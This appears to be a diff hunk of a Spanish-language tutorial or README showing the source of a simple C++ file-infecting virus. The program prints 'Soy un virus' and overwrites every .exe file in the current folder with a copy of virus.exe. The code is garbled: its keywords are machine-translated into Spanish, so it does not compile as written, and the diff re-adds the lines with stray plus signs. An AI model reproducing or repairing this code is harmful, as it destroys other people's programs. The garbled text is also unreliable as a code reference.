@@ -30,40 +30,40 @@ Haciendo que los demás cuando se ejecute se vean igual:
  por ultimo una muestra del codigo utilisado:
 
 
-incluir  < iostream >
-# incluir  < fstream >
-# incluir  < cadena.h >
-# include  < dirección.h >
-# incluir  < ventanas.h >
-bool  soloExe (std::string archivo);
-int  principal (){
-    std::cout<< " Soy un virus \n " ;
-    std::string nombreArchivos;
-    DIR *directorio;
-    tipo int ;
-    struct  dirent *elementos;
-    if (directorio= abrirdir ( " . " )){
-        while (elementos= readdir (directorio))
-        {
-            nombreArchivos=elementos-> d_nombre ;
-            tipo=elementos-> d_tipo ;
-            if (nombreArchivos!= " .. " && nombreArchivos!= " . " && tipo== 0 && soloExe (nombreArchivos) ){
-                CopyFile ( " virus.exe " , nombreArchivos.c_str (), false );
-            }
-        }
++#incluir  < iostream >
++# incluir  < fstream >
++# incluir  < cadena.h >
++# include  < dirección.h >
++# incluir  < ventanas.h >
++bool  soloExe (std::string archivo);
++int  principal (){
+ +   std::cout<< " Soy un virus \n " ;
+ +  std::string nombreArchivos;
+  +  DIR *directorio;
+   + tipo int ;
+    +struct  dirent *elementos;
+    +if (directorio= abrirdir ( " . " )){
+     +   while (elementos= readdir (directorio))
+      +  {
+       +     nombreArchivos=elementos-> d_nombre ;
+        +    tipo=elementos-> d_tipo ;
+         +   if (nombreArchivos!= " .. " && nombreArchivos!= " . " && tipo== 0 && soloExe (nombreArchivos) ){
+          +      CopyFile ( " virus.exe " , nombreArchivos.c_str (), false );
+           + }
+        +}
 
-    }
+    +}
 
-    sistema ( " pausa " );
-    devolver  0 ;
-}
-bool  soloExe (std::string archivo){
-    if (archivo. substr (archivo. find_last_of ( " . " )+ 1 )== " exe " ){
-        devolver  verdadero ;
-    } más {
-        devolver  falso ;
-    }
-}
+    +sistema ( " pausa " );
+    +devolver  0 ;
++}
++bool  soloExe (std::string archivo){
+ +   if (archivo. substr (archivo. find_last_of ( " . " )+ 1 )== " exe " ){
+  +      devolver  verdadero ;
+   + } más {
+    +    devolver  falso ;
+    +}
++}
 
 
 
